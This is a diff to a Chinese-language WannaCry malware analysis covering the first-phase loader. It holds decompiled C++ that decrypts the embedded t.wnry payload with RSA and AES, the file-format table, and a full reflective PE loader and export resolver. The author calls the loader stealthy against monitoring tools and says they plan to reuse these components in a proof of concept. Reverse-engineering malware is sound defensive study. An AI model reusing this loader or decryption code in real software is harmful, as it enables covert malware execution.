@@ -24,6 +24,7 @@ The attack started on Friday, 12 May 2017, and within a day was reported to have
 
 在这次分析结束后，我会将这两个Hack Weapon抽取出来，并写一个POC代码，复用这两个组件。
 
+## first phase ##
 
 **tasksche** 
 
@@ -715,7 +716,7 @@ if ( pBuffer[index] == 'P' && pBuffer[index + 1] == 'K' && pBuffer[index + 2] ==
         <th>u.wnry</th>
         <th>PE</th>
 		<th>UI Interface</th>
-		<th>![](https://github.com/tedzhang2891/Ransomware/blob/master/Wannacry/picture/Wana%20Decrypt0r.png)</th>
+		<th>Wana Decrypt0r 2.0</th>
     </tr>
 </table>
 
@@ -753,4 +754,435 @@ int SetBitcoinAddress()
 
 到这里Payload也已经成功的提取出来了，那我们之前说过Wannacry是分两阶段攻击的，第一阶段还有一个最重要的任务就是将加密程序悄无声息的加载起来。 现在到了激动人心的时刻，通过接下来的分析，我们能够掌握PeLoader的运行原理。 作为第二阶段攻击的最重要的Weapon，Peloader将无视微软API，来完成Pe dll的动态加载。
 
+如果不想翻到最上面看的话，这里有一个代码片段：
+```C++
+CProgram::ctor(&Program);
+if ( CProgram::Initialize(&Program, 0, 0, 0) )
+{
+nFileSize = 0;
+lpPEFile = CProgram::GetPeFile(&Program, aT_wnry, &nFileSize);
+if ( lpPEFile )
+{
+  pPeBuilder = WncryLoadPE(lpPEFile, nFileSize);
+  if ( pPeBuilder )
+  {
+    fpTaskStart = WncrySeek2TaskStart(pPeBuilder, szTaskStart);
+    if ( fpTaskStart )
+      fpTaskStart(0, 0);
+  }
+}
+}
+CProgram::dtor_0(&Program);
+```
 
+这里面有两个数据结构比较重要CProgram和CPeBuilder，先来看一下CProgram:
+
+```C++
+class CProgram
+{
+  void *vtable;
+  CWnCryptContext pWnCryptContext1;
+  CWnCryptContext pWnCryptContext2;
+  CWnAES AES;
+  LPCSTR *lpBuffer1M_1;
+  LPCSTR *lpBuffer1M_2;
+  int lpBufferUsed_2;
+  int lpBufferUsed_1;
+};
+```
+
+```C++
+struct CWnCryptContext
+{
+  void *vtable;
+  HCRYPTPROV phProv;
+  HCRYPTKEY hKey1;
+  HCRYPTKEY hKey2;
+  CRITICAL_SECTION CriticalSection;
+};
+```
+
+程序首先构造一个CProgram对象，并初始化内部的CWnCryptContext与CWnAES成员，其中微软的CWnCryptContext使用的CSP是“Microsoft Enhanced RSA and AES Cryptographic Provider”算法是RSA，RSA秘钥是从程序的数据段中读出来的。 
+
+```C++
+void *__thiscall CProgram::GetPeFile(CProgram *this, LPCSTR lpFileName, int *nRet)
+{
+  int pRbuff; 
+  HANDLE hFile; 
+  size_t Size; 
+  int blank; 
+  char lpBuffer[8] = {0}; 
+  __int64 dwFileSize; 
+  char lpPlaintext; 
+  DWORD nRetSize; 
+  int pBuffer; 
+  LARGE_INTEGER FileSize; 
+  int lpNumberOfBytesRead; 
+  CPPEH_RECORD ms_exc; 
+
+  pRbuff = 0;
+  nRetSize = 0;
+  Size = 0;
+  blank = 0;
+  lpNumberOfBytesRead = 0;
+  ms_exc.registration.TryLevel = 0;
+  hFile = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);// t.wnry
+  if ( hFile != INVALID_HANDLE_VALUE )
+  {
+    GetFileSizeEx(hFile, &FileSize);
+    if ( FileSize.QuadPart <= 0x6400000 )       // 100 MB
+    {
+      if ( fpReadFile(hFile, lpBuffer, 8, &lpNumberOfBytesRead, 0) )
+      {
+        if ( !memcmp(lpBuffer, aWanacry, 8u) )  // WANACRY!
+        {
+          if ( fpReadFile(hFile, &Size, 4, &lpNumberOfBytesRead, 0) )
+          {
+            if ( Size == 0x100 )
+            {
+              if ( fpReadFile(hFile, this->lpBuffer1M_1, 0x100, &lpNumberOfBytesRead, 0) )
+              {
+                if ( fpReadFile(hFile, &blank, 4, &lpNumberOfBytesRead, 0) )
+                {
+                  if ( fpReadFile(hFile, &dwFileSize, 8, &lpNumberOfBytesRead, 0) )
+                  {
+                    if ( dwFileSize <= 0x6400000 )// 100 MB
+                    {
+                      if ( CWnCryptContext::DecryptData(
+                             &this->pWnCryptContext1,
+                             this->lpBuffer1M_1,
+                             Size,
+                             &lpPlaintext,
+                             &nRetSize) )
+                      {
+                        AES_InitKey(&this->AES, &lpPlaintext, gBuffer, nRetSize, 16u);
+                        pBuffer = GlobalAlloc(0, dwFileSize);
+                        if ( pBuffer )
+                        {
+                          if ( fpReadFile(hFile, this->lpBuffer1M_1, FileSize.s.LowPart, &lpNumberOfBytesRead, 0)
+                            && lpNumberOfBytesRead
+                            && (SHIDWORD(dwFileSize) < 0
+                             || SHIDWORD(dwFileSize) <= 0 && lpNumberOfBytesRead >= dwFileSize) )
+                          {
+                            pRbuff = pBuffer;
+                            AES_Decrypt(&this->AES, this->lpBuffer1M_1, pBuffer, lpNumberOfBytesRead, 1);
+                            *nRet = dwFileSize;
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+  local_unwind2(&ms_exc.registration, -1);
+  return pRbuff;
+}
+```
+
+上面的CProgram::GetPeFile函数利用程序数据段中的PublicKey对t.wnry中的一段数据进行解密，这段数据解密出来后是AES初始化向量，然后用它去初始化AES加密Key，之后继续读取将用这个AESKey加密的PE文件读取到内存中，并用初始化后的AESKey进行解密，这个函数返回一个在内存中的PE文件，接下来就轮到PeBuilder上场了。
+
+通过这部分，我们可以了解一个被加密的文件的加密结构，通过后面没有提到的二阶段攻击分析，我发现即使是用户被加密的文件的加密后格式也与这个文件一致。
+
+<table>
+    <tr>
+        <th>Offset</th>
+        <th>Summary</th>
+		<th>Data</th>
+    </tr>
+	<tr>
+        <th>0x0000:0x0007</th>
+        <th>MagicCode</th>
+		<th>"WANACRY!"</th>
+    </tr>
+	<tr>
+        <th>0x0008:0x000B</th>
+        <th>Size of Encrypt AES Vector</th>
+		<th></th>
+    </tr>
+	<tr>
+        <th>0x000C:0x010B</th>
+        <th>Body of Encrypt AES Vector</th>
+		<th></th>
+    </tr>
+	<tr>
+        <th>0x010C:0x011F</th>
+        <th>Blank 4 bytes</th>
+		<th></th>
+    </tr>
+	<tr>
+        <th>0x0110:0x0117</th>
+        <th>File Size</th>
+		<th></th>
+    </tr>
+	<tr>
+        <th>0x0118:Numble of size</th>
+        <th>File Content</th>
+		<th></th>
+    </tr>
+</table>
+
+**PeBuilder**
+
+刚才Wannacry已经将在ResourceData中的t.wnry释放出来，并通过上面的解密动作成功在内存中放置了一个PE File，现在可以利用PeBuilder进行动态加载了。 PeBuilder非常的精巧，也很繁琐。
+
+```C++
+CPeBuilder *__cdecl BuildPEExecutable(DOS_Header *fileBuffer, size_t nFileSize, LPVOID (__cdecl *VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD, int), int (__cdecl *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType, int), HMODULE (__cdecl *LoadLibraryA)(LPCSTR lpLibFileName), int (__cdecl *GetProcAddress)(HMODULE, LPCSTR, DWORD), BOOL (__cdecl *FreeLibrary)(HMODULE hLibModule), int zero)
+{
+  IMAGE_NT_HEADERS *pPEHead; 
+  DWORD dwSectionAlignment; 
+  int wNumberOfSections;
+  data_directory *data_dir; 
+  __int32 sectionSize; 
+  __int32 sectionVirtualAddress; 
+  int j;
+  HMODULE hKernel32; 
+  void (__stdcall *fpGetNativeSystemInfo)(SYSTEM_INFO *); 
+  DWORD nPage; 
+  DWORD dwSize; 
+  LPVOID lpPEFile; 
+  HANDLE hHeap; 
+  CPeBuilder *TmpVar; 
+  CPeBuilder *pPeBuilder; 
+  IMAGE_NT_HEADERS *PEHeader; 
+  DWORD lpEntryPoint; 
+  SYSTEM_INFO lpSystemInfo; 
+  unsigned int i; 
+  LPVOID zeroa; 
+
+  i = 0;
+  if ( !WncryCheckFileSize(nFileSize, 64u) )
+    return 0;
+  if ( fileBuffer->signature != 'ZM' )
+    goto LABEL_3;
+  if ( !WncryCheckFileSize(nFileSize, *&fileBuffer->reserved2[4] + 248) )
+    return 0;
+  pPEHead = (fileBuffer + *&fileBuffer->reserved2[4]);
+  if ( pPEHead->Signature != 'EP' )
+    goto LABEL_3;
+  if ( pPEHead->FileHeader.Machine != 0x14C )
+    goto LABEL_3;
+  dwSectionAlignment = pPEHead->OptionalHeader.SectionAlignment;
+  if ( dwSectionAlignment & 1 )
+    goto LABEL_3;
+  wNumberOfSections = pPEHead->FileHeader.NumberOfSections;
+  if ( pPEHead->FileHeader.NumberOfSections )
+  {
+    data_dir = (&pPEHead->OptionalHeader.SizeOfUninitializedData + pPEHead->FileHeader.SizeOfOptionalHeader);
+    do
+    {
+      sectionSize = data_dir->Size;
+      sectionVirtualAddress = data_dir->VirtualAddress;
+      if ( sectionSize )
+        j = sectionSize + sectionVirtualAddress;
+      else
+        j = dwSectionAlignment + sectionVirtualAddress;
+      if ( j > i )
+        i = j;
+      data_dir += 5;
+      --wNumberOfSections;
+    }
+    while ( wNumberOfSections );
+  }
+  hKernel32 = GetModuleHandleA(szKernel32);
+  if ( !hKernel32 )
+    return 0;
+  fpGetNativeSystemInfo = GetProcAddress(hKernel32, aGetnativesyste, 0);
+  if ( !fpGetNativeSystemInfo )
+    return 0;
+  fpGetNativeSystemInfo(&lpSystemInfo);
+  nPage = ~(lpSystemInfo.dwPageSize - 1);
+  dwSize = nPage & (pPEHead->OptionalHeader.SizeOfImage + lpSystemInfo.dwPageSize - 1);
+  if ( dwSize != (nPage & (lpSystemInfo.dwPageSize + i - 1)) )
+  {
+LABEL_3:
+    SetLastError(ERROR_BAD_EXE_FORMAT);
+    return 0;
+  }
+  lpPEFile = VirtualAlloc(pPEHead->OptionalHeader.ImageBase, dwSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE, zero);
+  if ( !lpPEFile )
+  {
+    lpPEFile = VirtualAlloc(0, dwSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE, zero);
+    if ( !lpPEFile )
+    {
+LABEL_24:
+      SetLastError(ERROR_OUTOFMEMORY);
+      return 0;
+    }
+  }
+  hHeap = GetProcessHeap();
+  TmpVar = HeapAlloc(hHeap, 8u, 0x3Cu);
+  pPeBuilder = TmpVar;
+  if ( !TmpVar )
+  {
+    VirtualFree(lpPEFile, 0, MEM_RELEASE, zero);
+    goto LABEL_24;
+  }
+  TmpVar->ImageBase = lpPEFile;
+  LOWORD(TmpVar) = pPEHead->FileHeader.Characteristics;
+  pPeBuilder->bitResult = (TmpVar >> 13) & 1;
+  pPeBuilder->fpVirtualAlloc = VirtualAlloc;
+  pPeBuilder->fpVirtualFree = VirtualFree;
+  pPeBuilder->fpLoadLibraryA = LoadLibraryA;
+  pPeBuilder->fpGetProcAddress = GetProcAddress;
+  pPeBuilder->fpFreeLibrary = FreeLibrary;
+  pPeBuilder->Placeholder = zero;
+  pPeBuilder->dwPageSize = lpSystemInfo.dwPageSize;// The page size and the granularity of page protection and commitment. This is the page size used by the VirtualAlloc function.
+  if ( !WncryCheckFileSize(nFileSize, pPEHead->OptionalHeader.SizeOfHeaders)
+    || (zeroa = VirtualAlloc(lpPEFile, pPEHead->OptionalHeader.SizeOfHeaders, MEM_COMMIT, PAGE_READWRITE, zero),
+        memcpy(zeroa, fileBuffer, pPEHead->OptionalHeader.SizeOfHeaders),
+        PEHeader = (zeroa + *&fileBuffer->reserved2[4]),
+        pPeBuilder->PEHeader = PEHeader,
+        PEHeader->OptionalHeader.ImageBase = lpPEFile,
+        !WncryBuildPESection(fileBuffer, nFileSize, pPEHead, pPeBuilder))
+    || (pPeBuilder->PEHeader->OptionalHeader.ImageBase == pPEHead->OptionalHeader.ImageBase ? (pPeBuilder->bRelocation = 1) : (pPeBuilder->bRelocation = WncryBaseRelocation(pPeBuilder, pPeBuilder->PEHeader->OptionalHeader.ImageBase - pPEHead->OptionalHeader.ImageBase)),
+        !WncryFixImportTable(pPeBuilder) || !WncrySetPageProtect(pPeBuilder) || !WncryPerformTlsCallback(pPeBuilder)) )
+  {
+LABEL_37:
+    WncryReleasePE(pPeBuilder);
+    return 0;
+  }
+  lpEntryPoint = pPeBuilder->PEHeader->OptionalHeader.AddressOfEntryPoint;
+  if ( lpEntryPoint )
+  {
+    if ( pPeBuilder->bitResult )
+    {
+      if ( !((lpPEFile + lpEntryPoint))(lpPEFile, 1, 0) )
+      {
+        SetLastError(ERROR_DLL_INIT_FAILED);
+        goto LABEL_37;
+      }
+      pPeBuilder->bEP = 1;
+    }
+    else
+    {
+      pPeBuilder->lpEntryPoint = (lpPEFile + lpEntryPoint);
+    }
+  }
+  else
+  {
+    pPeBuilder->lpEntryPoint = 0;
+  }
+  return pPeBuilder;
+}
+```
+
+我相信即使是翻译成C++代码，看到上面的大篇幅代码也没有读下去的动力了，何况我看的是汇编级别的代码。 那我简单讲一下好了，这个函数会返回一个PeBuilder对象，它会解决加载这个pe对象的所有系统级别的工作。
+
+```C++
+!WncryBuildPESection(fileBuffer, nFileSize, pPEHead, pPeBuilder))
+    || (pPeBuilder->PEHeader->OptionalHeader.ImageBase == pPEHead->OptionalHeader.ImageBase ? (pPeBuilder->bRelocation = 1) : (pPeBuilder->bRelocation = WncryBaseRelocation(pPeBuilder, pPeBuilder->PEHeader->OptionalHeader.ImageBase - pPEHead->OptionalHeader.ImageBase)),
+        !WncryFixImportTable(pPeBuilder) || !WncrySetPageProtect(pPeBuilder) || !WncryPerformTlsCallback(pPeBuilder)) )
+```
+
+上面是一些重要的片段，如果你没有仔细读上面大片的代码，那么看看这个也是可以的。 
+
+这个PeBuilder厉害之处在于，只调用了以下5个系统API，因此即使利用Monitor工具也无法发现有一个Loaddll的动作在里面。
+
+- VirtualAlloc
+- VirtualFree
+- LoadLibraryA
+- GetProcAddress
+- FreeLibrary
+
+虽然有LoadLibrary在但是貌似没有使用。
+
+CPeBuilder的数据结构如下：
+
+```C++
+struct CPeBuilder
+{
+  IMAGE_NT_HEADERS *PEHeader;
+  void *ImageBase;
+  DWORD *pArrayLibs;
+  int dwNumOfLibs;
+  int bEP;
+  int bitResult;
+  int bRelocation;
+  LPVOID (__cdecl *fpVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD, int);
+  int (__cdecl *fpVirtualFree)(LPVOID, SIZE_T, DWORD, int);
+  HMODULE (__cdecl *fpLoadLibraryA)(LPCSTR lpLibFileName);
+  int (__cdecl *fpGetProcAddress)(HMODULE, LPCSTR, DWORD);
+  BOOL (__cdecl *fpFreeLibrary)(HMODULE hLibModule);
+  int Placeholder;
+  int lpEntryPoint;
+  DWORD dwPageSize;
+};
+```
+
+得到了CPeBuilder对象后，Wannacry利用Seek2TaskStart方法来定位到Dll中导出的TaskStart函数，并调用这个函数，真正开始第二阶段的攻击。
+
+```C++
+int __cdecl Seek2TaskStart(CPeBuilder *pPeBuilder, char *szTaskStart)
+{
+  void *ImageBase; 
+  IMAGE_DATA_DIRECTORY *dd_export; 
+  DWORD va; 
+  unsigned int dwNumberOfNames;
+  IMAGE_EXPORT_DIRECTORY *va_export; 
+  DWORD Base; 
+  DWORD funcOrdinal; 
+  DWORD AddressOfNames; 
+  DWORD AddressOfNameOrdinals; 
+  DWORD nCount; 
+
+  ImageBase = pPeBuilder->ImageBase;
+  dd_export = pPeBuilder->PEHeader->OptionalHeader.DataDirectory;
+  ImageBase = pPeBuilder->ImageBase;
+  if ( !pPeBuilder->PEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size )
+    goto LABEL_10;
+  va = dd_export->VirtualAddress;
+  dwNumberOfNames = *(ImageBase + dd_export->VirtualAddress + 0x18);
+  va_export = (ImageBase + va);
+  if ( !dwNumberOfNames || !va_export->NumberOfFunctions )
+    goto LABEL_10;
+  if ( !HIWORD(szTaskStart) )
+  {
+    Base = va_export->Base;
+    if ( szTaskStart >= Base )
+    {
+      funcOrdinal = szTaskStart - Base;
+      goto LABEL_13;
+    }
+LABEL_10:
+    SetLastError(ERROR_PROC_NOT_FOUND);
+    return 0;
+  }
+  AddressOfNames = (ImageBase + va_export->AddressOfNames);
+  AddressOfNameOrdinals = (ImageBase + va_export->AddressOfNameOrdinals);
+  nCount = 0;
+  if ( dwNumberOfNames <= 0 )
+    goto LABEL_10;
+  while ( stricmp(szTaskStart, ImageBase + *AddressOfNames) )
+  {
+    ++nCount;
+    AddressOfNames += 4;
+    AddressOfNameOrdinals += 2;
+    if ( nCount >= va_export->NumberOfNames )
+      goto LABEL_10;
+  }
+  funcOrdinal = *AddressOfNameOrdinals;
+LABEL_13:
+  if ( funcOrdinal > va_export->NumberOfFunctions )
+    goto LABEL_10;
+  return (ImageBase + *(ImageBase + 4 * funcOrdinal + va_export->AddressOfFunctions));
+}
+```
+
+上面这个函数接受CPeBuilder以及一个Func Name作为参数，程序在PE的Export中搜索名为FuncName的导出函数，并返回这个导出函数。
+
+```C++
+fpTaskStart = Seek2TaskStart(pPeBuilder, szTaskStart);
+            if ( fpTaskStart )
+              fpTaskStart(0, 0);
+```
+
+调用导出函数，攻击开始。
+
+
+## second phase ##
